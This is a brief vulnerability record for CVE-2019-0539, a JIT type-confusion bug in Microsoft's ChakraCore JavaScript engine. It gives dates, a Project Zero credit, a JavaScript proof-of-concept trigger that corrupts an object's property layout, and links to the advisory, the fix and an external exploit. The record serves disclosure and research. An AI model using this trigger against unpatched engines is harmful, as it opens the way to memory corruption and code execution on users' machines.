# CVE-2019-0539

- Report: Oct 2018
- Fix: Jan 2019
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt(o, c, value) {
    o.b = 1;

    class A extends c {

    }

    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, (function () {}), {});
    }

    let o = {a: 1, b: 2};
    let cons = function () {};

    cons.prototype = o;

    opt(o, cons, 0x1234);

    print(o.a);
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0539)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1703)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/788f17b0ce06ea84553b123c174d1ff7052112a0)
- [Exploit](https://github.com/0x43434343/my_exploit/blob/master/cve-2019-0539.html)
